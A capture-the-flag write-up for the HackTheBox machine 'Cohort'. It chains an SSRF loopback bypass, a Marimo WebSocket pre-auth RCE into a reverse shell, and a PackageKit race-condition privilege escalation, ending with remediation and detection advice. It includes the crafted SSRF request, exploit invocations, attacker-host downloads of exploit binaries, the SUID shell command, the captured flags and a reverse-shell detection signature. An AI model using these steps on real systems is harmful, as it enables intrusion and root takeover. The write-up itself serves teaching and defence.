# Cohort - Internal API SSRF & PackageKit TOCTOU

**Platform:** HackTheBox | **Target OS:** Linux | **Difficulty:** Easy
**Focus:** IP Obfuscation (SSRF), Nginx ACL Bypass, Marimo WebSocket Pre-Auth RCE, D-Bus TOCTOU (PackageKit LPE)

## 1. Executive Summary & Attack Chain
This assessment highlights a severe attack path originating from an improperly sanitized Server-Side Request Forgery (SSRF) vulnerability, leading to a complete system compromise via Linux IPC (Inter-Process Communication) exploitation. The initial vector involved a data-feed validation endpoint (`/api/validate`) which was tricked into querying the server's own loopback interface. By utilizing IP obfuscation (`127.1`), internal Nginx Access Control Lists (ACLs) were bypassed to leak internal virtual host configurations.

The leaked configurations revealed an internal `marimo` Python notebook instance. Exploiting a known pre-authentication WebSocket flaw in Marimo (CVE-2026-39987), an interactive reverse shell was established. Local enumeration uncovered an outdated `PackageKit` service. By exploiting a Time-of-Check to Time-of-Use (TOCTOU) race condition in how PackageKit handles D-Bus transactions (CVE-2026-41651), a malicious `.deb` package was installed, yielding a root-level SUID shell and full system takeover.

**Kill-Chain summary:**
1. **Reconnaissance:** External mapping identified a web portal accepting external URLs for validation.
2. **Initial Access:** Exploited SSRF via `127.1` to bypass Nginx ACLs, leaking internal routing to a hidden `marimo` instance (port 8888).
3. **Execution:** Leveraged CVE-2026-39987 (Marimo WebSocket RCE) to gain a foothold as the `marimo` user.
4. **Privilege Escalation:** Exploited a D-Bus race condition (TOCTOU) in PackageKit (CVE-2026-41651) to silently drop and execute a malicious Debian package as `root`.

---

## 2. Network Reconnaissance & Surface Mapping
The engagement commenced with a standard Nmap scan to identify exposed services on the target.

```bash
❯ nmap -sV -sC 10.129.244.174
Starting Nmap 7.991 ( https://nmap.org ) at 2026-09-16 07:10 +0300
Nmap scan report for 10.129.244.174
Host is up (0.26s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 9.6p1 Ubuntu 3ubuntu13.18 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)
|_  256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)
80/tcp  open  http     nginx 1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to https://cohort.htb/
|_http-server-header: nginx/1.24.0 (Ubuntu)
443/tcp open  ssl/http nginx 1.24.0 (Ubuntu)
|_ssl-date: TLS randomness does not represent time
|_http-title: Did not follow redirect to https://cohort.htb/
| ssl-cert: Subject: commonName=cohort.htb/organizationName=Cohort Analytics
| Subject Alternative Name: DNS:cohort.htb, DNS:*.cohort.htb
| Not valid before: 2026-06-01T18:47:07
|_Not valid after:  2126-05-08T18:47:07
| tls-alpn:
|   http/1.1
|   http/1.0
|_  http/0.9
|_http-server-header: nginx/1.24.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 51.59 seconds
```
The Nmap scan revealed a standard web server architecture redirecting to `cohort.htb`. 

---

## 3. Initial Access & SSRF to Marimo RCE
Investigation of the web application (`https://cohort.htb/portal.html`) revealed a feature allowing users to input a "Report source URL" for backend fetching. 

### Theoretical Mechanics: SSRF & IP Obfuscation
Server-Side Request Forgery (SSRF) occurs when a web application fetches a remote resource without validating the destination. In this scenario, the `/api/validate` endpoint accepts JSON payloads containing a URL. While fuzzing directories earlier, a `/status` endpoint was discovered, returning a `403 Forbidden` response. This is a common Nginx configuration (`allow 127.0.0.1; deny all;`).

To bypass application-layer blacklists that block strings like `"127.0.0.1"` or `"localhost"`, **IP Obfuscation** was utilized. By passing `127.1`, the backend validation logic failed to recognize it as a loopback address. However, at the OS networking layer (POSIX `inet_aton`), `127.1` is perfectly valid and seamlessly translated to `127.0.0.1`. The server effectively queried its own restricted `/status` endpoint, bypassing the Nginx ACL because the request originated internally.

**SSRF Trigger:**
```http
POST /api/validate HTTP/1.1
Host: cohort.htb
Content-Length: 38
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: en-US,en;q=0.9
Accept: application/json
Sec-Ch-Ua: "Chromium";v="151", "Not=A?Brand";v="99"
Content-Type: application/json
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36
Origin: https://cohort.htb
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://cohort.htb/portal.html
Accept-Encoding: gzip, deflate, br
Priority: u=1, i
Connection: keep-alive

{"url":"http://127.1/status","format":"csv"}
```

**Response (Leaking internal routing):**
```json
HTTP/1.1 200 OK
Server: nginx/1.24.0 (Ubuntu)
Date: Wed, 16 Sep 2026 04:45:08 GMT
Content-Type: application/json
Content-Length: 548
Connection: keep-alive

{"ok": true, "fetched_status": 200, "content_type": "application/json", "preview": "{\"service\":\"cohort-edge\",\"status\":\"ok\",\"generated_by\":\"nginx\",\"upstreams\":[{\"name\":\"marketing\",\"host\":\"cohort.htb\",\"root\":\"/var/www/cohort\"},{\"name\":\"insights-api\",\"host\":\"cohort.htb\",\"path\":\"/api/\",\"target\":\"127.0.0.1:5000\"},{\"name\":\"notebooks\",\"host\":\"nb-1be3782a8afd3ad5.cohort.htb\",\"target\":\"127.0.0.1:8888\",\"note\":\"internal analyst workspace, not for external use\"}]}", "message": "Source reachable."}
```
This leaked the internal vhost `nb-1be3782a8afd3ad5.cohort.htb` routing to port `8888` (a Marimo instance). 

### OS Mechanics: Marimo Pre-Auth RCE (CVE-2026-39987)
Marimo versions up to 0.22.x are vulnerable to CVE-2026-39987. The vulnerability stems from a lack of authentication on the application's WebSocket endpoint (`/terminal/ws`). WebSockets begin with a standard HTTP GET request with an `Upgrade: websocket` header. Because the application logic fails to validate session cookies or authorization tokens during this handshake, an unauthenticated attacker can establish a raw TCP-like connection directly to the backend pseudo-terminal (PTY) and execute arbitrary system commands.

An exploit script was obtained and utilized to execute a reverse shell. Initial attempts failed due to invalid schemes and syntax quirks, but refining the URL payload resulted in successful exploitation.

```bash
❯ python 52673.py -u http://nb-1be3782a8afd3ad5.cohort.htb:8888 --lhost 10.10.16.29 --lport 4444
[+] Connecting to ws://nb-1be3782a8afd3ad5.cohort.htb:8888/terminal/ws...
[-] Error: [Errno 111] Connection refused

░▒▓ 💀 0xZiki   arch    
 󰅚 ❯ python 52673.py -u https://nb-1be3782a8afd3ad5.cohort.htb/ --lhost 10.10.16.29 --lport 4444
[+] Connecting to wss://nb-1be3782a8afd3ad5.cohort.htb/terminal/ws...
[+] Executing reverse shell!
[+] Check your netcat listener on port 4444!

❯ nc -lnvp 4444
Listening on 0.0.0.0 4444
Connection received on 10.129.244.174 49106
bash: initialize_job_control: no job control in background: Bad file descriptor
marimo@cohort:~$ whoami
marimo
marimo@cohort:~$ cat user.txt
46422667873ff7f7f2fbdf99da015d8d
```

---

## 4. Privilege Escalation & PackageKit TOCTOU (CVE-2026-41651)
Initial enumeration as `marimo` revealed hardened configurations (namespaces, `NoNewPrivileges`). However, querying installed packages exposed a vulnerable version of `PackageKit`.

```bash
marimo@cohort:/$ dpkg-query -W -f='${Package} ${Version}\n' packagekit
packagekit 1.2.8-2ubuntu1.2
```

### Theoretical IPC/OS Mechanics: PackageKit Pack2TheRoot 
PackageKit acts as a system-wide abstraction layer for package management (APT, dpkg), operating via **D-Bus** (Desktop Bus), a Linux Inter-Process Communication (IPC) mechanism. 
The flaw (CVE-2026-41651) is a **Time-of-Check to Time-of-Use (TOCTOU)** vulnerability. 
1. When an attacker sends a D-Bus `InstallFiles` request with the `SIMULATE` flag (0x4), `packagekitd` bypasses `polkit` authorization because it assumes it's merely a dry run. 
2. However, the transaction arguments (like file paths and flags) are stored in shared memory asynchronously before the GLib event loop executes the job. 
3. If an attacker rapidly fires a *second* `InstallFiles` request with a malicious payload *before* the first transaction executes, the variables in memory are overwritten (Bug 1 & 3). 
4. The worker thread then dispatches the job: it uses the *authorization* status of the first request (Simulate = No Polkit check) but executes the *payload* of the second request (a malicious `.deb` file). The `.deb` post-install scripts run as `root` and generate an SUID bash binary.

A pre-compiled binary targeting this specific D-Bus race condition was transferred to the victim and executed, generating a root SUID shell in `/tmp/.suid_bash`.

```bash
marimo@cohort:/tmp$ curl -O http://10.10.16.29:8000/cve-2026-41651
marimo@cohort:/tmp$ chmod +x cve-2026-41651
marimo@cohort:/tmp$ ./cve-2026-41651
═══════════════════════════════════════════════════
 CVE-2026-41651 — PackageKit TOCTOU LPE
═══════════════════════════════════════════════════
[*] Building packages (pure C)...
[+] dummy   : /tmp/.pk-dummy-6875.deb
[+] payload : /tmp/.pk-payload-6875.deb
[*] Transaction : /2_aecbdeae
[*] Step 1 : InstallFiles(SIMULATE=0x4, dummy) [async]
[*] Step 2 : InstallFiles(NONE=0x0, payload) [async]
[*] Waiting for dispatch (30 s max)...
[!] PK error 48: Failed to obtain authentication.
[*] Finished (exit=2, 0 ms)
[*] Loop ran for 80 ms
[*] Polling for payload (120 s max)...
uid=1000(marimo) gid=1000(marimo) euid=0(root) groups=1000(marimo)
[+] SUCCESS — SUID bash at t+3300ms

marimo@cohort:/tmp$ curl -O http://10.10.16.29:8000/exploit.bin
marimo@cohort:/tmp$ chmod +x exploit.bin
marimo@cohort:/tmp$ nohup /tmp/exploit.bin >/tmp/pk.log 2>&1 &
[1] 7093
marimo@cohort:/tmp$ /tmp/.suid_bash -p -c 'id; cat /root/root.txt'
uid=1000(marimo) gid=1000(marimo) euid=0(root) groups=1000(marimo)
05de2fb6af87ae47a97e77432ad8377e
```

---

## 5. Defensive Remediation & Detection Engineering

### Remediation Strategies
1. **SSRF Mitigation:** Do not rely on string-matching blacklists (e.g., denying `"127.0.0.1"`) to prevent SSRF. Use dedicated network-level egress filtering. Backend application logic should resolve the hostname/IP to an integer format and ensure it does not fall within RFC1918 (Private IP) or loopback ranges before initializing the HTTP request.
2. **Marimo Updates:** Upgrade Marimo to version `0.23.0` or higher to ensure proper authorization mechanisms are enforced on the `/terminal/ws` WebSocket upgrade handshake.
3. **PackageKit Patching:** Update the `PackageKit` system daemon to version `1.3.5` or later, which correctly sanitizes the `InstallFiles` transaction cache and prevents concurrent state overrides. 

### Detection Engineering
* **Web Proxy Logs:** Monitor Nginx/WAF logs for unusual IP formats (e.g., `127.1`, `0x7F000001`, or `2130706433`) traversing the `url` parameter in `/api/validate`.
* **Process Creation (Event ID 4688 / Auditd):** Alert on reverse shell patterns initiated by the `marimo` process tree. Command signatures such as `bash -i >& /dev/tcp/` are highly anomalous for a Python notebook environment.
* **D-Bus & Apt Logs:** Monitor `/var/log/dpkg.log` or `/var/log/apt/history.log` for sudden installations of unverified or locally-sourced `.deb` packages originating from `/tmp/`. 
* **SUID Binary Creation:** Use `auditd` to monitor the creation of files with the SUID bit set (`chmod +s`), particularly inside world-writable directories like `/tmp` or `/dev/shm`.
